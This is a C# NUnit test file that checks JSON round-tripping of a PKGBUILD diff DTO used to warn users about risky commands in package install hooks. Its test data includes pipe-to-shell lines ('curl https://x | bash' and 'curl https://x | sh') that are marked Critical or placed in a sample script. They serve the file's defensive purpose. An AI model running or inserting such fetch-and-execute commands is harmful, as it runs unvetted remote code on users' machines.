using Shelly.Gtk.Helpers;
using Shelly.Utilities.Eventing;

namespace Shelly.Gtk.Tests;

[TestFixture]
public class PkgbuildWarningSerializationTests
{
    [Test]
    public void PkgbuildDiffQuestionDto_RoundTrips_WithWarnings()
    {
        var original = new PkgbuildDiffQuestionDto(
            "abc123",
            "some-package",
            "old pkgbuild",
            "new pkgbuild",
            [
                new PkgbuildWarningDto("npm", "Warning", "post_install",
                    "npm install -g foo", "'npm' is invoked in post_install()."),
                new PkgbuildWarningDto("curl", "Critical", "post_install",
                    "curl https://x | bash", "'curl' is invoked in post_install()."),
            ]);

        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);

        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
        var dto = decoded as PkgbuildDiffQuestionDto;
        Assert.That(dto, Is.Not.Null);
        Assert.That(dto!.PackageName, Is.EqualTo("some-package"));
        Assert.That(dto.Warnings, Has.Count.EqualTo(2));
        Assert.That(dto.Warnings[0].Tool, Is.EqualTo("npm"));
        Assert.That(dto.Warnings[0].Severity, Is.EqualTo("Warning"));
        Assert.That(dto.Warnings[0].Hook, Is.EqualTo("post_install"));
        Assert.That(dto.Warnings[0].MatchedLine, Is.EqualTo("npm install -g foo"));
        Assert.That(dto.Warnings[1].Tool, Is.EqualTo("curl"));
        Assert.That(dto.Warnings[1].Severity, Is.EqualTo("Critical"));
    }

    [Test]
    public void PkgbuildDiffQuestionDto_RoundTrips_WithEmptyWarnings()
    {
        var original = new PkgbuildDiffQuestionDto(
            "id", "pkg", "old", "new", []);

        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);

        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
        var dto = decoded as PkgbuildDiffQuestionDto;
        Assert.That(dto, Is.Not.Null);
        Assert.That(dto!.Warnings, Is.Empty);
    }

    [Test]
    public void PkgbuildDiffQuestionDto_RoundTrips_WithSourceFiles()
    {
        var original = new PkgbuildDiffQuestionDto(
            "id", "pkg", "old", "new", [], null,
            new Dictionary<string, string>
            {
                ["element-desktop-nightly.sh"] = "#!/bin/sh\ncurl https://x | sh\n"
            });

        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);

        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
        var dto = decoded as PkgbuildDiffQuestionDto;
        Assert.That(dto, Is.Not.Null);
        Assert.That(dto!.SourceFiles, Is.Not.Null);
        Assert.That(dto.SourceFiles, Has.Count.EqualTo(1));
        Assert.That(dto.SourceFiles!["element-desktop-nightly.sh"],
            Does.Contain("curl https://x | sh"));
    }

    [Test]
    public void PkgbuildDiffQuestionDto_RoundTrips_WithNullSourceFiles()
    {
        var original = new PkgbuildDiffQuestionDto(
            "id", "pkg", "old", "new", [], null, null);

        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);

        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
        var dto = decoded as PkgbuildDiffQuestionDto;
        Assert.That(dto, Is.Not.Null);
        Assert.That(dto!.SourceFiles, Is.Null);
    }
}
